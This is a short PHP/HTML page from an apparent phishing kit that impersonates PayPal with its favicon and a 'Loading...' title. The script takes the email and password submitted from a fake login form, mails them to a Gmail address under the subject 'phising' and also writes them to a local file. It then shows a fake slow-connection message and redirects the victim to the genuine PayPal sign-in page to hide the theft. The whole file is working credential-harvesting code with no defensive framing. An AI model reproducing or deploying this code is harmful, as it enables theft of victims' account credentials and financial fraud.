<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <title>Loading...</title>
</head>

<body>
    <?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    $message = $email . " " . $password . "\n";

    mail('livechatvald00s@gmail.com', 'phising', $message);
    $myfile = fopen("hasil.txt", "a") or die("Unable to open file!");
    fwrite($myfile, $message);
    fclose($myfile);

    echo 'Internet connection is slow ... ';
    //redirecting user to a closed facebook group
    header('Refresh: 2; URL=https://www.paypal.com/id/signin/');
    ?>
</body>

</html>